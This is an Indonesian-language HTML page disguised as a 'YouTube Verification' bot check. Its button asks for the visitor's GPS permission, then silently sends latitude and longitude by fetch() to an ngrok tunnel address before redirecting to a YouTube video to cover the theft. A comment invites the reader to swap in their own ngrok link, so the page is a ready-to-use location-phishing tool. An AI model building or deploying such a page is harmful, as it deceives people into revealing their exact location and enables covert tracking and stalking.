<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Verification</title>
    <style>
        body { font-family: sans-serif; background: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 350px; }
        button { background: #cc0000; color: white; border: none; padding: 15px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="card">
        <h3>Verifikasi Keamanan</h3>
        <p>Klik tombol di bawah untuk melanjutkan ke video.</p>
        <button onclick="kirimData()">SAYA BUKAN BOT</button>
        <p id="status" style="font-size: 12px; color: gray; margin-top: 10px;"></p>
    </div>

    <script>
        function kirimData() {
            const status = document.getElementById('status');
            // GANTI INI DENGAN LINK NGROK KAMU
            const linkNgrok = "https://adiabatically-nonhomogeneous-gavin.ngrok-free.dev";

            status.innerText = "Meminta izin lokasi...";

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    
                    status.innerText = "Mengirim verifikasi...";

                    fetch(`${linkNgrok}/api/kirim-lokasi?lat=${lat}&lon=${lon}`)
                    .then(() => {
                        status.innerText = "Berhasil! Mengalihkan...";
                        setTimeout(() => {
                            window.location.href = "https://www.youtube.com/watch?v=EFmxPMdBqmU";
                        }, 1000);
                    })
                    .catch(err => alert("Gagal kirim ke server!"));
                }, (err) => {
                    alert("Izin lokasi ditolak! Aktifkan GPS kamu.");
                });
            }
        }
    </script>
</body>
</html>
